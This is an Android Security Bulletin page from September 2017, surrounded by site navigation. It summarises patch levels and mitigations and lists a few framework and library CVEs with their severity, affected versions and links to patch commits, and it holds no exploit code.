  + [Core Topics](/docs/core)
  + [Compatibility](/docs/compatibility)
  + [Android Devices](/docs/devices)
  + [Automotive](/docs/automotive)
  + [Reference](/reference)
* [Android Code Search](https://cs.android.com/android/platform/superproject/main)

* [Overview](/docs/security)
* Security overview
  + [Secure an Android device](/docs/security/overview)
  + [Kernel security](/docs/security/overview/kernel-security)
  + [App security](/docs/security/overview/app-security)
  + [Implement security](/docs/security/overview/implement)
  + [Updates and resources](/docs/security/overview/updates-resources)
  + [ASPIRE](/docs/security/overview/aspire)
  + [Reports](/docs/security/overview/reports)
  + [Enhancements](/docs/security/enhancements)
  + [Acknowledgements](/docs/security/overview/acknowledgements)
* Android Security Bulletins
  + [Bulletins home](/docs/security/bulletin)
  + [Overview](/docs/security/bulletin/asb-overview)
  + 2025 bulletins
    - [January](/docs/security/bulletin/2025-01-01)
  + 2024 bulletins
    - [December](/docs/security/bulletin/2024-12-01)
    - [November](/docs/security/bulletin/2024-11-01)
    - [October](/docs/security/bulletin/2024-10-01)
    - [September](/docs/security/bulletin/2024-09-01)
    - [August](/docs/security/bulletin/2024-08-01)
    - [July](/docs/security/bulletin/2024-07-01)
    - [June](/docs/security/bulletin/2024-06-01)
    - [May](/docs/security/bulletin/2024-05-01)
    - [April](/docs/security/bulletin/2024-04-01)
    - [March](/docs/security/bulletin/2024-03-01)
    - [February](/docs/security/bulletin/2024-02-01)
    - [January](/docs/security/bulletin/2024-01-01)
    - [Android 15](/docs/security/bulletin/android-15)
  + 2023 bulletins
    - [December](/docs/security/bulletin/2023-12-01)
    - [November](/docs/security/bulletin/2023-11-01)
    - [October](/docs/security/bulletin/2023-10-01)
    - [September](/docs/security/bulletin/2023-09-01)
    - [August](/docs/security/bulletin/2023-08-01)
    - [July](/docs/security/bulletin/2023-07-01)
    - [June](/docs/security/bulletin/2023-06-01)
    - [May](/docs/security/bulletin/2023-05-01)
    - [April](/docs/security/bulletin/2023-04-01)
    - [March](/docs/security/bulletin/2023-03-01)
    - [February](/docs/security/bulletin/2023-02-01)
    - [January](/docs/security/bulletin/2023-01-01)
    - [Android 14](/docs/security/bulletin/android-14)
  + 2022 bulletins
    - [December](/docs/security/bulletin/2022-12-01)
    - [November](/docs/security/bulletin/2022-11-01)
    - [October](/docs/security/bulletin/2022-10-01)
    - [September](/docs/security/bulletin/2022-09-01)
    - [August](/docs/security/bulletin/2022-08-01)
    - [July](/docs/security/bulletin/2022-07-01)
    - [June](/docs/security/bulletin/2022-06-01)
    - [May](/docs/security/bulletin/2022-05-01)
    - [April](/docs/security/bulletin/2022-04-01)
    - [March](/docs/security/bulletin/2022-03-01)
    - [Android 12L](/docs/security/bulletin/android-12l)
    - [February](/docs/security/bulletin/2022-02-01)
    - [January](/docs/security/bulletin/2022-01-01)
    - [Android 13](/docs/security/bulletin/android-13)
    - [Index](/docs/security/bulletin/2022)
  + 2021 bulletins
    - [December](/docs/security/bulletin/2021-12-01)
    - [November](/docs/security/bulletin/2021-11-01)
    - [October](/docs/security/bulletin/2021-10-01)
    - [September](/docs/security/bulletin/2021-09-01)
    - [August](/docs/security/bulletin/2021-08-01)
    - [July](/docs/security/bulletin/2021-07-01)
    - [June](/docs/security/bulletin/2021-06-01)
    - [May](/docs/security/bulletin/2021-05-01)
    - [April](/docs/security/bulletin/2021-04-01)
    - [March](/docs/security/bulletin/2021-03-01)
    - [February](/docs/security/bulletin/2021-02-01)
    - [January](/docs/security/bulletin/2021-01-01)
    - [Android 12](/docs/security/bulletin/android-12)
    - [Index](/docs/security/bulletin/2021)
  + 2020 bulletins
    - [December](/docs/security/bulletin/2020-12-01)
    - [November](/docs/security/bulletin/2020-11-01)
    - [October](/docs/security/bulletin/2020-10-01)
    - [September](/docs/security/bulletin/2020-09-01)
    - [August](/docs/security/bulletin/2020-08-01)
    - [July](/docs/security/bulletin/2020-07-01)
    - [June](/docs/security/bulletin/2020-06-01)
    - [May](/docs/security/bulletin/2020-05-01)
    - [April](/docs/security/bulletin/2020-04-01)
    - [March](/docs/security/bulletin/2020-03-01)
    - [February](/docs/security/bulletin/2020-02-01)
    - [January](/docs/security/bulletin/2020-01-01)
    - [Android 11](/docs/security/bulletin/android-11)
    - [Index](/docs/security/bulletin/2020)
  + 2019 bulletins
    - [December](/docs/security/bulletin/2019-12-01)
    - [November](/docs/security/bulletin/2019-11-01)
    - [October](/docs/security/bulletin/2019-10-01)
    - [September](/docs/security/bulletin/2019-09-01)
    - [August](/docs/security/bulletin/2019-08-01)
    - [July](/docs/security/bulletin/2019-07-01)
    - [June](/docs/security/bulletin/2019-06-01)
    - [May](/docs/security/bulletin/2019-05-01)
    - [April](/docs/security/bulletin/2019-04-01)
    - [March](/docs/security/bulletin/2019-03-01)
    - [February](/docs/security/bulletin/2019-02-01)
    - [January](/docs/security/bulletin/2019-01-01)
    - [Android 10](/docs/security/bulletin/android-10)
    - [Index](/docs/security/bulletin/2019)
  + 2018 bulletins
    - [December](/docs/security/bulletin/2018-12-01)
    - [November](/docs/security/bulletin/2018-11-01)
    - [October](/docs/security/bulletin/2018-10-01)
    - [September](/docs/security/bulletin/2018-09-01)
    - [August](/docs/security/bulletin/2018-08-01)
    - [July](/docs/security/bulletin/2018-07-01)
    - [June](/docs/security/bulletin/2018-06-01)
    - [May](/docs/security/bulletin/2018-05-01)
    - [April](/docs/security/bulletin/2018-04-01)
    - [March](/docs/security/bulletin/2018-03-01)
    - [February](/docs/security/bulletin/2018-02-01)
    - [January](/docs/security/bulletin/2018-01-01)
    - [Index](/docs/security/bulletin/2018)
  + 2017 bulletins
    - [December](/docs/security/bulletin/2017-12-01)
    - [November](/docs/security/bulletin/2017-11-01)
    - [October](/docs/security/bulletin/2017-10-01)
    - [September](/docs/security/bulletin/2017-09-01)
    - [August](/docs/security/bulletin/2017-08-01)
    - [July](/docs/security/bulletin/2017-07-01)
    - [June](/docs/security/bulletin/2017-06-01)
    - [May](/docs/security/bulletin/2017-05-01)
    - [April](/docs/security/bulletin/2017-04-01)
    - [March](/docs/security/bulletin/2017-03-01)
    - [February](/docs/security/bulletin/2017-02-01)
    - [January](/docs/security/bulletin/2017-01-01)
    - [Index](/docs/security/bulletin/2017)
  + 2016 bulletins
    - [December](/docs/security/bulletin/2016-12-01)
    - [November](/docs/security/bulletin/2016-11-01)
    - [October](/docs/security/bulletin/2016-10-01)
    - [September](/docs/security/bulletin/2016-09-01)
    - [August](/docs/security/bulletin/2016-08-01)
    - [July](/docs/security/bulletin/2016-07-01)
    - [June](/docs/security/bulletin/2016-06-01)
    - [May](/docs/security/bulletin/2016-05-01)
    - [April](/docs/security/bulletin/2016-04-02)
    - [March](/docs/security/bulletin/2016-03-01)
    - [February](/docs/security/bulletin/2016-02-01)
    - [January](/docs/security/bulletin/2016-01-01)
    - [Index](/docs/security/bulletin/2016)
  + 2015 bulletins
    - [December](/docs/security/bulletin/2015-12-01)
    - [November](/docs/security/bulletin/2015-11-01)
    - [October](/docs/security/bulletin/2015-10-01)
    - [September](/docs/security/bulletin/2015-09-01)
    - [August](/docs/security/bulletin/2015-08-01)
    - [Index](/docs/security/bulletin/2015)
  + Pixel/Nexus bulletins
  + [Overview](/docs/security/bulletin/pixel)
  + 2025 bulletins
    - [January](/docs/security/bulletin/pixel/2025-01-01)
  + 2024 bulletins
    - [December](/docs/security/bulletin/pixel/2024-12-01)
    - [November](/docs/security/bulletin/pixel/2024-11-01)
    - [October](/docs/security/bulletin/pixel/2024-10-01)
    - [September](/docs/security/bulletin/pixel/2024-09-01)
    - [August](/docs/security/bulletin/pixel/2024-08-01)
    - [July](/docs/security/bulletin/pixel/2024-07-01)
    - [June](/docs/security/bulletin/pixel/2024-06-01)
    - [May](/docs/security/bulletin/pixel/2024-05-01)
    - [April](/docs/security/bulletin/pixel/2024-04-01)
    - [March](/docs/security/bulletin/pixel/2024-03-01)
    - [February](/docs/security/bulletin/pixel/2024-02-01)
    - [January](/docs/security/bulletin/pixel/2024-01-01)
  + 2023 bulletins
    - [December](/docs/security/bulletin/pixel/2023-12-01)
    - [November](/docs/security/bulletin/pixel/2023-11-01)
    - [October](/docs/security/bulletin/pixel/2023-10-01)
    - [September](/docs/security/bulletin/pixel/2023-09-01)
    - [August](/docs/security/bulletin/pixel/2023-08-01)
    - [July](/docs/security/bulletin/pixel/2023-07-01)
    - [June](/docs/security/bulletin/pixel/2023-06-01)
    - [May](/docs/security/bulletin/pixel/2023-05-01)
    - [April](/docs/security/bulletin/pixel/2023-04-01)
    - [March](/docs/security/bulletin/pixel/2023-03-01)
    - [February](/docs/security/bulletin/pixel/2023-02-01)
    - [January](/docs/security/bulletin/pixel/2023-01-01)
  + 2022 bulletins
    - [December](/docs/security/bulletin/pixel/2022-12-01)
    - [November](/docs/security/bulletin/pixel/2022-11-01)
    - [October](/docs/security/bulletin/pixel/2022-10-01)
    - [September](/docs/security/bulletin/pixel/2022-09-01)
    - [August](/docs/security/bulletin/pixel/2022-08-01)
    - [July](/docs/security/bulletin/pixel/2022-07-01)
    - [June](/docs/security/bulletin/pixel/2022-06-01)
    - [May](/docs/security/bulletin/pixel/2022-05-01)
    - [April](/docs/security/bulletin/pixel/2022-04-01)
    - [March](/docs/security/bulletin/pixel/2022-03-01)
    - [February](/docs/security/bulletin/pixel/2022-02-01)
    - [January](/docs/security/bulletin/pixel/2022-01-01)
  + 2021 bulletins
    - [December](/docs/security/bulletin/pixel/2021-12-01)
    - [November](/docs/security/bulletin/pixel/2021-11-01)
    - [October](/docs/security/bulletin/pixel/2021-10-01)
    - [September](/docs/security/bulletin/pixel/2021-09-01)
    - [August](/docs/security/bulletin/pixel/2021-08-01)
    - [July](/docs/security/bulletin/pixel/2021-07-01)
    - [June](/docs/security/bulletin/pixel/2021-06-01)
    - [May](/docs/security/bulletin/pixel/2021-05-01)
    - [April](/docs/security/bulletin/pixel/2021-04-01)
    - [March](/docs/security/bulletin/pixel/2021-03-01)
    - [February](/docs/security/bulletin/pixel/2021-02-01)
    - [January](/docs/security/bulletin/pixel/2021-01-01)
    - [Index](/docs/security/bulletin/pixel/2021)
  + 2020 bulletins
    - [December](/docs/security/bulletin/pixel/2020-12-01)
    - [November](/docs/security/bulletin/pixel/2020-11-01)
    - [October](/docs/security/bulletin/pixel/2020-10-01)
    - [September](/docs/security/bulletin/pixel/2020-09-01)
    - [August](/docs/security/bulletin/pixel/2020-08-01)
    - [July](/docs/security/bulletin/pixel/2020-07-01)
    - [June](/docs/security/bulletin/pixel/2020-06-01)
    - [May](/docs/security/bulletin/pixel/2020-05-01)
    - [April](/docs/security/bulletin/pixel/2020-04-01)
    - [March](/docs/security/bulletin/pixel/2020-03-01)
    - [February](/docs/security/bulletin/pixel/2020-02-01)
    - [January](/docs/security/bulletin/pixel/2020-01-01)
    - [Index](/docs/security/bulletin/pixel/2020)
  + 2019 bulletins
    - [December](/docs/security/bulletin/pixel/2019-12-01)
    - [November](/docs/security/bulletin/pixel/2019-11-01)
    - [October](/docs/security/bulletin/pixel/2019-10-01)
    - [September](/docs/security/bulletin/pixel/2019-09-01)
    - [August](/docs/security/bulletin/pixel/2019-08-01)
    - [July](/docs/security/bulletin/pixel/2019-07-01)
    - [June](/docs/security/bulletin/pixel/2019-06-01)
    - [May](/docs/security/bulletin/pixel/2019-05-01)
    - [April](/docs/security/bulletin/pixel/2019-04-01)
    - [March](/docs/security/bulletin/pixel/2019-03-01)
    - [February](/docs/security/bulletin/pixel/2019-02-01)
    - [January](/docs/security/bulletin/pixel/2019-01-01)
    - [Index](/docs/security/bulletin/pixel/2019)
  + 2018 bulletins
    - [December](/docs/security/bulletin/pixel/2018-12-01)
    - [November](/docs/security/bulletin/pixel/2018-11-01)
    - [October](/docs/security/bulletin/pixel/2018-10-01)
    - [September](/docs/security/bulletin/pixel/2018-09-01)
    - [August](/docs/security/bulletin/pixel/2018-08-01)
    - [July](/docs/security/bulletin/pixel/2018-07-01)
    - [June](/docs/security/bulletin/pixel/2018-06-01)
    - [May](/docs/security/bulletin/pixel/2018-05-01)
    - [April](/docs/security/bulletin/pixel/2018-04-01)
    - [March](/docs/security/bulletin/pixel/2018-03-01)
    - [February](/docs/security/bulletin/pixel/2018-02-01)
    - [January](/docs/security/bulletin/pixel/2018-01-01)
    - [Index](/docs/security/bulletin/pixel/2018)
  + 2017 bulletins
    - [December](/docs/security/bulletin/pixel/2017-12-01)
    - [November](/docs/security/bulletin/pixel/2017-11-01)
    - [October](/docs/security/bulletin/pixel/2017-10-01)
    - [Index](/docs/security/bulletin/pixel/2017)
  + Android Automotive
  + [Overview](/docs/security/bulletin/aaos)
  + 2025 bulletins
    - [January](/docs/security/bulletin/aaos/2025-01-01)
  + 2024 bulletins
    - [December](/docs/security/bulletin/aaos/2024-12-01)
    - [November](/docs/security/bulletin/aaos/2024-11-01)
    - [October](/docs/security/bulletin/aaos/2024-10-01)
    - [September](/docs/security/bulletin/aaos/2024-09-01)
    - [August](/docs/security/bulletin/aaos/2024-08-01)
    - [July](/docs/security/bulletin/aaos/2024-07-01)
    - [June](/docs/security/bulletin/aaos/2024-06-01)
    - [May](/docs/security/bulletin/aaos/2024-05-01)
    - [April](/docs/security/bulletin/aaos/2024-04-01)
    - [March](/docs/security/bulletin/aaos/2024-03-01)
    - [February](/docs/security/bulletin/aaos/2024-02-01)
    - [January](/docs/security/bulletin/aaos/2024-01-01)
  + 2023 bulletins
    - [December](/docs/security/bulletin/aaos/2023-12-01)
    - [November](/docs/security/bulletin/aaos/2023-11-01)
    - [October](/docs/security/bulletin/aaos/2023-10-01)
    - [September](/docs/security/bulletin/aaos/2023-09-01)
    - [August](/docs/security/bulletin/aaos/2023-08-01)
    - [July](/docs/security/bulletin/aaos/2023-07-01)
    - [June](/docs/security/bulletin/aaos/2023-06-01)
    - [May](/docs/security/bulletin/aaos/2023-05-01)
    - [April](/docs/security/bulletin/aaos/2023-04-01)
    - [March](/docs/security/bulletin/aaos/2023-03-01)
    - [February](/docs/security/bulletin/aaos/2023-02-01)
    - [January](/docs/security/bulletin/aaos/2023-01-01)
  + 2022 bulletins
    - [December](/docs/security/bulletin/aaos/2022-12-01)
    - [November](/docs/security/bulletin/aaos/2022-11-01)
    - [October](/docs/security/bulletin/aaos/2022-10-01)
    - [September](/docs/security/bulletin/aaos/2022-09-01)
    - [August](/docs/security/bulletin/aaos/2022-08-01)
    - [July](/docs/security/bulletin/aaos/2022-07-01)
    - [June](/docs/security/bulletin/aaos/2022-06-01)
    - [May](/docs/security/bulletin/aaos/2022-05-01)
    - [April](/docs/security/bulletin/aaos/2022-04-01)
    - [March](/docs/security/bulletin/aaos/2022-03-01)
    - [February](/docs/security/bulletin/aaos/2022-02-01)
    - [January](/docs/security/bulletin/aaos/2022-01-01)
  + 2021 bulletins
    - [December](/docs/security/bulletin/aaos/2021-12-01)
    - [November](/docs/security/bulletin/aaos/2021-11-01)
    - [October](/docs/security/bulletin/aaos/2021-10-01)
    - [September](/docs/security/bulletin/aaos/2021-09-01)
    - [August](/docs/security/bulletin/aaos/2021-08-01)
    - [July](/docs/security/bulletin/aaos/2021-07-01)
    - [June](/docs/security/bulletin/aaos/2021-06-01)
    - [May](/docs/security/bulletin/aaos/2021-05-01)
    - [April](/docs/security/bulletin/aaos/2021-04-01)
    - [March](/docs/security/bulletin/aaos/2021-03-01)
    - [February](/docs/security/bulletin/aaos/2021-02-01)
    - [January](/docs/security/bulletin/aaos/2021-01-01)
  + Chromecast
  + [Overview](/docs/security/bulletin/chromecast)
  + 2024 bulletins
    - [December](/docs/security/bulletin/chromecast/2024-12-01)
    - [September](/docs/security/bulletin/chromecast/2024-09-01)
    - [July](/docs/security/bulletin/chromecast/2024-07-01)
    - [March](/docs/security/bulletin/chromecast/2024-03-01)
  + 2023 bulletins
    - [December](/docs/security/bulletin/chromecast/2023-12-01)
    - [September](/docs/security/bulletin/chromecast/2023-07-01)
    - [June](/docs/security/bulletin/chromecast/2023-06-01)
    - [April](/docs/security/bulletin/chromecast/2023-04-01)
  + 2022 bulletins
    - [December](/docs/security/bulletin/chromecast/2022-12-01)
    - [October](/docs/security/bulletin/chromecast/2022-10-01)
    - [July](/docs/security/bulletin/chromecast/2022-07-01)
  + Wear
  + [Overview](/docs/security/bulletin/wear)
  + 2025 bulletins
    - [January](/docs/security/bulletin/wear/2025/2025-01-01)
  + 2024 bulletins
    - [December](/docs/security/bulletin/wear/2024/2024-12-01)
    - [November](/docs/security/bulletin/wear/2024/2024-11-01)
    - [October](/docs/security/bulletin/wear/2024/2024-10-01)
    - [September](/docs/security/bulletin/wear/2024/2024-09-01)
    - [August](/docs/security/bulletin/wear/2024/2024-08-01)
    - [July](/docs/security/bulletin/wear/2024/2024-07-01)
    - [June](/docs/security/bulletin/wear/2024/2024-06-01)
    - [May](/docs/security/bulletin/wear/2024/2024-05-01)
    - [April](/docs/security/bulletin/wear/2024/2024-04-01)
    - [March](/docs/security/bulletin/wear/2024/2024-03-01)
    - [February](/docs/security/bulletin/wear/2024/2024-02-01)
    - [January](/docs/security/bulletin/wear/2024/2024-01-01)
  + 2023 bulletins
    - [December](/docs/security/bulletin/wear/2023/2023-12-01)
    - [November](/docs/security/bulletin/wear/2023/2023-11-01)
    - [October](/docs/security/bulletin/wear/2023/2023-10-01)
    - [September](/docs/security/bulletin/wear/2023/2023-09-01)
    - [August](/docs/security/bulletin/wear/2023/2023-08-01)
  + Pixel Watch
  + [Overview](/docs/security/bulletin/pixel-watch)
  + 2024 bulletins
    - [December](/docs/security/bulletin/pixel-watch/2024-12-01)
    - [August](/docs/security/bulletin/pixel-watch/2024-08-01)
    - [July](/docs/security/bulletin/pixel-watch/2024-07-01)
    - [June](/docs/security/bulletin/pixel-watch/2024-06-01)
    - [May](/docs/security/bulletin/pixel-watch/2024-05-01)
    - [April](/docs/security/bulletin/pixel-watch/2024-04-01)
    - [March](/docs/security/bulletin/pixel-watch/2024-03-01)
    - [February](/docs/security/bulletin/pixel-watch/2024-02-01)
    - [January](/docs/security/bulletin/pixel-watch/2024-01-01)
  + 2023 bulletins
    - [December](/docs/security/bulletin/pixel-watch/2023/2023-12-01)
    - [September](/docs/security/bulletin/pixel-watch/2023/2023-09-01)
    - [June](/docs/security/bulletin/pixel-watch/2023/2023-06-01)
  + Advisories
  + [Overview](/docs/security/bulletin/advisory)
  + [March 2016](/docs/security/bulletin/advisory/2016-03-18)
* Features
  + [Overview](/docs/security/features)
  + [Application Sandbox](/docs/security/app-sandbox)
  + [OMAPI vendor stable interface](/docs/security/features/open-mobile-api)
  + App signing
    - [Overview](/docs/security/features/apksigning)
    - [APK signature scheme v2](/docs/security/features/apksigning/v2)
    - [APK signature scheme v3](/docs/security/features/apksigning/v3)
    - [APK signature scheme v3.1](/docs/security/features/apksigning/v3-1)
    - [APK signature scheme v4](/docs/security/features/apksigning/v4)
  + Authentication
    - [Overview](/docs/security/features/authentication)
    - [Gatekeeper](/docs/security/features/authentication/gatekeeper)
    - Biometrics
      * [Overview](/docs/security/features/biometric)
      * [Measure biometric security](/docs/security/features/biometric/measure)
      * [Fingerprint HIDL](/docs/security/features/authentication/fingerprint-hal)
      * [Face authentication HIDL](/docs/security/features/biometric/face-authentication)
    - Protected confirmation
      * [Overview](/docs/security/features/protected-confirmation)
      * [Implementation](/docs/security/features/protected-confirmation/implementation)
      * [Design guidelines](/docs/security/features/protected-confirmation/design)
      * [Accessibility](/docs/security/features/protected-confirmation/accessibility)
  + DICE
    - [Overview](/docs/security/features/dice)
    - [Applications of DICE](/docs/security/features/dice/applications-of-dice)
  + Encryption
    - [Overview](/docs/security/features/encryption)
    - [File-based encryption](/docs/security/features/encryption/file-based)
    - [Full-disk encryption](/docs/security/features/encryption/full-disk)
    - [Metadata encryption](/docs/security/features/encryption/metadata)
    - [Enable Adiantum](/docs/security/features/encryption/adiantum)
    - [Hardware-wrapped keys](/docs/security/features/encryption/hw-wrapped-keys)
  + Keystore
    - [Overview](/docs/security/features/keystore)
    - [Features](/docs/security/features/keystore/features)
    - [Key and ID attestation](/docs/security/features/keystore/attestation)
    - [Version binding](/docs/security/features/keystore/version-binding)
    - [Authorization tags](/docs/security/features/keystore/tags)
    - [Functions](/docs/security/features/keystore/implementer-ref)
  + Identity credential
    - [Overview](/docs/security/features/identity-credentials)
  + SELinux
    - [Overview](/docs/security/features/selinux)
    - [Concepts](/docs/security/features/selinux/concepts)
    - [Implementation](/docs/security/features/selinux/implement)
    - [Customization](/docs/security/features/selinux/customize)
    - [Build sepolicy](/docs/security/features/selinux/build)
    - [Compatibility](/docs/security/features/selinux/compatibility)
    - [Validation](/docs/security/features/selinux/validate)
    - [Write policy](/docs/security/features/selinux/device-policy)
    - [Vendor init](/docs/security/features/selinux/vendor-init)
  + Trusty TEE
    - [Overview](/docs/security/features/trusty)
    - [Download and build](/docs/security/features/trusty/download-and-build)
    - [Trusty API reference](/docs/security/features/trusty/trusty-ref)
  + Verified Boot
    - [Overview](/docs/security/features/verifiedboot)
    - [Device state](/docs/security/features/verifiedboot/device-state)
    - [Verify Boot](/docs/security/features/verifiedboot/verified-boot)
    - [Boot flow](/docs/security/features/verifiedboot/boot-flow)
    - [Implement dm-verity](/docs/security/features/verifiedboot/dm-verity)
    - [Verify system\_other partition](/docs/security/features/verifiedboot/verify-system-other-partition)
    - [Reference implementation](/docs/security/features/verifiedboot/avb)
  + Safety Center
    - [Overview](/docs/security/safety-center/overview)
    - [Customize Safety Center](/docs/security/safety-center/customize)
    - [Customize Safety Center UI](/docs/security/safety-center/customize-ui)
    - [Interact with Safety Center](/docs/security/safety-center/interact)
    - [Testing and validation](/docs/security/safety-center/test-requirements)
  + Cellular security
    - [Overview](/docs/security/features/cellular-security/overview)
    - [Disable 2G](/docs/security/features/cellular-security/disable-2g)
  + [Private space](/docs/security/features/private-space)
* Testing
  + [Overview](/docs/security/test/fuzz-sanitize)
  + [Memory safety](/docs/security/test/memory-safety)
  + Arm Memory Tagging Extension
  + [Overview](/docs/security/test/memory-safety/arm-mte)
  + [Bootloader support](/docs/security/test/memory-safety/bootloader-support)
  + [Understand MTE reports](/docs/security/test/memory-safety/mte-reports)
  + [MTE configuration](/docs/security/test/memory-safety/mte-configuration)
  + Sanitizers
  + [Overview](/docs/security/test/sanitizers)
  + [AddressSanitizer](/docs/security/test/asan)
  + [Kernel AddressSanitizer](/docs/security/test/kasan)
  + [Hardware-assisted AddressSanitizer](/docs/security/test/hwasan)
  + [Understand HWASan reports](/docs/security/test/memory-safety/hwasan-reports)
  + [UndefinedBehaviorSanitizer](/docs/security/test/ubsan)
  + Other topics
  + [Control flow integrity](/docs/security/test/cfi)
  + [Kernel control flow integrity](/docs/security/test/kcfi)
  + [Execute-only memory](/docs/security/test/execute-only-memory)
  + [Fuzz with libFuzzer](/docs/security/test/libfuzzer)
  + [GWP-ASan and KFENCE](/docs/security/test/memory-safety/gwp-asan-kfence)
  + [Security Test Suite development kit](/docs/security/test/sts-sdk)
  + [Scudo](/docs/security/test/scudo)
  + [ShadowCallStack](/docs/security/test/shadow-call-stack)
  + [Tagged pointers](/docs/security/test/tagged-pointers)
  + [Zero initialized memory](/docs/security/test/memory-safety/zero-initialized-memory)
* Best practices
  + [Overview](/docs/security/best-practices)
  + [Operational security](/docs/security/best-practices/ops)
  + [System security](/docs/security/best-practices/system)
  + [App security](/docs/security/best-practices/app)
  + [Network security](/docs/security/best-practices/network)
  + [Hardware security](/docs/security/best-practices/hardware)
  + [Privacy security](/docs/security/best-practices/privacy)

* What's new?
* [Release notes](/docs/whatsnew/release-notes)
* [Latest security bulletins](/docs/whatsnew/latest-security-bulletins)
* [Latest Compatibility Definition Document (CDD)](/docs/whatsnew/latest-cdd)
* [Site updates](/docs/whatsnew/site-updates)
* Getting Started
* [About](/docs/setup/about)
* [Start](/docs/setup/start)
* [Download](/docs/setup/download)
* [Build](/docs/setup/build)
* [Test](/docs/setup/test)
* [Create](/docs/setup/create/coding-tasks)
* [Contribute](/docs/setup/contribute)
* [Community](/docs/setup/community/cofc)
* [Tools, build, and related reference](/docs/setup/reference)
* Security
* [Overview](/docs/security/overview)
* [Bulletins](/docs/security/bulletin)
* [Features](/docs/security/features)
* [Testing](/docs/security/test/fuzz-sanitize)
* [Best Practices](/docs/security/best-practices)
* Core Topics
* [Architecture](/docs/core/architecture)
* [Audio](/docs/core/audio)
* [Camera](/docs/core/camera)
* [Connectivity](/docs/core/connect)
* [Data](/docs/core/data)
* [Display](/docs/core/display)
* [Fonts](/docs/core/fonts/custom-font-fallback)
* [Graphics](/docs/core/graphics)
* [Interaction](/docs/core/interaction)
* [Media](/docs/core/media)
* [Performance](/docs/core/perf)
* [Permissions](/docs/core/permissions)
* [Power](/docs/core/power)
* [Runtime](/docs/core/runtime)
* [Settings](/docs/core/settings)
* [Storage](/docs/core/storage)
* [Tests](/docs/core/tests)
* [Updates](/docs/core/ota)
* [Virtualization](/docs/core/virtualization)
* Compatibility
* [Compatibility Definition Document (CDD)](/docs/compatibility/cdd)
* [Compatibility Test Suite (CTS)](/docs/compatibility/cts)
* Android Devices
* [Cuttlefish](/docs/devices/cuttlefish)
* [Enterprise](/docs/devices/admin)
* [TV](/docs/devices/tv)
* Automotive
* [Get Started](/docs/automotive/start/what_automotive)
* [Guidelines for Development](/docs/automotive/guidelines)
* [Development Tools](/docs/automotive/dev-tools)
* [Testing Tools and Infrastructure](/docs/automotive/tools)
* [Release Details](/docs/automotive/start/releases)
* Reference
* [HIDL](/reference/hidl)
* [HAL](/reference/hal)
* [Trade Federation](/reference/tradefed/classes)
* [Security Test Suite](/reference/sts/classes)

* [AOSP](https://source.android.com/)
* [Security](https://source.android.com/docs/security)

# Android Security Bulletin—September 2017

Stay organized with collections

Save and categorize content based on your preferences.

*Published September 5, 2017 | Updated October 5, 2017*

The Android Security Bulletin contains details of security vulnerabilities
affecting Android devices. Security patch levels of September 05, 2017 or later
address all of these issues. Refer to the [Pixel
and Nexus update schedule](https://support.google.com/pixelphone/answer/4457705#pixel_phones&nexus_devices) to learn how to check a device's security patch
level.

Partners were notified of the issues described in the bulletin at least a month
ago. Source code patches for these issues have been released to the Android Open
Source Project (AOSP) repository and linked from this bulletin. This bulletin
also includes links to patches outside of AOSP.

The most severe of these issues is a critical severity vulnerability in media
framework that could enable a remote attacker using a specially crafted file to
execute arbitrary code within the context of a privileged process. The
[severity
assessment](/docs/security/overview/updates-resources#severity) is based on the effect that exploiting the vulnerability would
possibly have on an affected device, assuming the platform and service
mitigations are turned off for development purposes or if successfully bypassed.

We have had no reports of active customer exploitation or abuse of these newly
reported issues. Refer to the
[Android and Google Play Protect mitigations](#mitigations) section
for details on the [Android
security platform protections](/docs/security/enhancements) and Google Play Protect, which improve the
security of the Android platform.

We encourage all customers to accept these updates to their devices.

**Note:** Information on the latest over-the-air update (OTA) and
firmware images for Google devices is available in the
[Google device updates](#google-device-updates) section.

## Announcements

* This bulletin has two security patch level strings to provide Android
  partners with the flexibility to more quickly fix a subset of vulnerabilities
  that are similar across all Android devices. See
  [Common questions and answers](#questions) for additional information:
  + **2017-09-01**: Partial security patch level string. This
    security patch level string indicates that all issues associated with 2017-09-01
    (and all previous security patch level strings) are addressed.
  + **2017-09-05**: Complete security patch level string. This
    security patch level string indicates that all issues associated with 2017-09-01
    and 2017-09-05 (and all previous security patch level strings) are
    addressed.

## Android and Google service mitigations

This is a summary of the mitigations provided by the
[Android security platform](/docs/security/enhancements)
and service protections such as
[Google Play Protect](https://www.android.com/play-protect). These
capabilities reduce the likelihood that security vulnerabilities could be
successfully exploited on Android.

* Exploitation for many issues on Android is made more difficult by
  enhancements in newer versions of the Android platform. We encourage all users
  to update to the latest version of Android where possible.
* The Android security team actively monitors for abuse through [Google Play Protect](https://www.android.com/play-protect) and warns
  users about [Potentially Harmful Applications](https://developers.google.com/android/play-protect/potentially-harmful-applications). Google Play Protect is enabled by default on devices
  with [Google Mobile Services](http://www.android.com/gms), and is
  especially important for users who install apps from outside of Google
  Play.

## 2017-09-01 security patch level—Vulnerability details

In the sections below, we provide details for each of the security
vulnerabilities that apply to the 2017-09-01 patch level. Vulnerabilities are
grouped under the component that they affect. There is a description of the
issue and a table with the CVE, associated references,
[type of vulnerability](#type),
[severity](/docs/security/overview/updates-resources#severity),
and updated AOSP versions (where applicable). When available, we link the public
change that addressed the issue to the bug ID, like the AOSP change list. When
multiple changes relate to a single bug, additional references are linked to
numbers following the bug ID.

### Framework

The most severe vulnerability in this section could enable a local malicious
application to bypass user interaction requirements in order to gain access to
additional permissions.

| CVE | References | Type | Severity | Updated AOSP versions |
| CVE-2017-0752 | [A-62196835](https://android.googlesource.com/platform/frameworks/base/%2B/6ca2eccdbbd4f11698bd5312812b4d171ff3c8ce) [[2](https://android.googlesource.com/platform/packages/apps/Settings/%2B/fc65be941a4dbebfdbe53cd0bd6cc5cc1142a908)] | EoP | High | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |

### Libraries

The most severe vulnerability in this section could enable a remote attacker
using a specially crafted file to execute arbitrary code within the context of
an unprivileged process.

| CVE | References | Type | Severity | Updated AOSP versions |
| CVE-2017-0753 | [A-62218744](https://android.googlesource.com/platform/manifest/%2B/c0218b536c4243993bb666910d888cf16191dfd1) | RCE | High | 7.1.1, 7.1.2, 8.0 |
| CVE-2017-6983 | [A-63852675](https://android.googlesource.com/platform/external/sqlite/%2B/a1b4a910e8bf11e03479d91004652fc5919f475b) | RCE | High | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
